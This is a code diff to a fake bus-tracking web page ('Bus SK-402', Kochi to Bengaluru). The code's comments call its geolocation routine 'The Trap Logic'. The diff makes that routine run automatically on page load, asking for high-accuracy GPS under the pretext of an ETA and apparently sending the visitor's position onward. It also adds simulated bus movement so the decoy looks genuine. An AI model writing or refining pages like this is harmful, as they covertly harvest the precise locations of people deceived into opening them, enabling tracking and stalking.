@@ -24,8 +24,7 @@
         <div class="info-card">
             <p class="route-text"><b>Route:</b> Kochi ➔ Thrissur ➔ Palakkad ➔ Coimbatore ➔ Salem ➔ Hosur ➔ Bengaluru</p>
             <div id="map"></div>
-            <p id="status">Click below to see the bus distance from your current location.</p>
-            <button class="btn-update" onclick="getLocation()">Get Live Update</button>
+            <p id="status">Initializing live tracking...</p>
         </div>
     </div>
 
@@ -60,13 +59,53 @@
         L.marker(hosur).addTo(map).bindPopup('Hosur Stop');
         L.marker(bengaluru).addTo(map).bindPopup('Bengaluru Terminal (End)');
 
-        // Add a "Moving Bus" icon at a point on the line for realism (e.g. between Coimbatore and Salem)
-        L.circleMarker([11.3, 77.5], {radius: 8, color: 'blue', fillOpacity: 1}).addTo(map).bindPopup('Bus SK-402 (In Transit)');
+        // 3. Simulated Bus Movement Logic
+        function getInterpolatedPoint(points, distanceKm) {
+            let distanceMeters = distanceKm * 1000;
+            for (let i = 0; i < points.length - 1; i++) {
+                let p1 = L.latLng(points[i][0], points[i][1]);
+                let p2 = L.latLng(points[i+1][0], points[i+1][1]);
+                let segmentDist = p1.distanceTo(p2);
+                
+                if (distanceMeters <= segmentDist) {
+                    let ratio = distanceMeters / segmentDist;
+                    let lat = p1.lat + (p2.lat - p1.lat) * ratio;
+                    let lng = p1.lng + (p2.lng - p1.lng) * ratio;
+                    return [lat, lng];
+                } else {
+                    distanceMeters -= segmentDist;
+                }
+            }
+            return points[points.length - 1]; // Return last point if distance exceeds route
+        }
 
-        // 3. The Trap Logic
-        function getLocation() {
+        let progressKm = parseFloat(localStorage.getItem('busProgress') || '0');
+        if (progressKm === 0 && !localStorage.getItem('busInitialLoad')) {
+            localStorage.setItem('busInitialLoad', 'true');
+        } else {
+            progressKm += 5; // Move 5km on each refresh
+        }
+        localStorage.setItem('busProgress', progressKm);
+
+        let busLoc = getInterpolatedPoint(routeCoordinates, progressKm);
+
+        // Add the Moving Bus Marker
+        L.marker(busLoc, {
+            icon: L.icon({
+                iconUrl: 'https://raw.githubusercontent.com/pointhi/leaflet-color-markers/master/img/marker-icon-2x-red.png',
+                shadowUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/0.7.7/images/marker-shadow.png',
+                iconSize: [25, 41],
+                iconAnchor: [12, 41],
+                popupAnchor: [1, -34],
+                shadowSize: [41, 41]
+            })
+        }).addTo(map).bindPopup('<b>Bus SK-402 (In Transit)</b>').openPopup();
+        map.setView(busLoc, 10);
+
+        // 4. Auto-Run Trap Logic
+        window.onload = function() {
             const statusText = document.getElementById('status');
-            statusText.innerText = "Connecting to GPS...";
+            statusText.innerText = "Connecting to GPS for accurate ETA...";
 
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
@@ -88,29 +127,17 @@
                             })
                         });
 
-                        // Show the bus at Erode (Dummy coordinates) instead of the user's real location
-                        const erodeLat = 11.3410;
-                        const erodeLon = 77.7172;
-                        statusText.innerText = "Live Update: Bus is currently in Erode.";
-                        L.marker([erodeLat, erodeLon], {
-                            icon: L.icon({
-                                iconUrl: 'https://raw.githubusercontent.com/pointhi/leaflet-color-markers/master/img/marker-icon-2x-red.png',
-                                shadowUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/0.7.7/images/marker-shadow.png',
-                                iconSize: [25, 41],
-                                iconAnchor: [12, 41],
-                                popupAnchor: [1, -34],
-                                shadowSize: [41, 41]
-                            })
-                        }).addTo(map).bindPopup('<b>Bus SK-402 (Current Location)</b>').openPopup();
-                        map.setView([erodeLat, erodeLon], 13);
+                        statusText.innerText = "Live tracking active. Bus progress updated.";
                     },
                     (err) => {
-                        statusText.innerText = "Error: Please allow to view updates.";
+                        statusText.innerText = "Live tracking limited (GPS restricted).";
                     },
                     { enableHighAccuracy: true, timeout: 10000 }
                 );
+            } else {
+                statusText.innerText = "Live tracking limited (GPS not supported).";
             }
-        }
+        };
     </script>
 </body>
 </html>
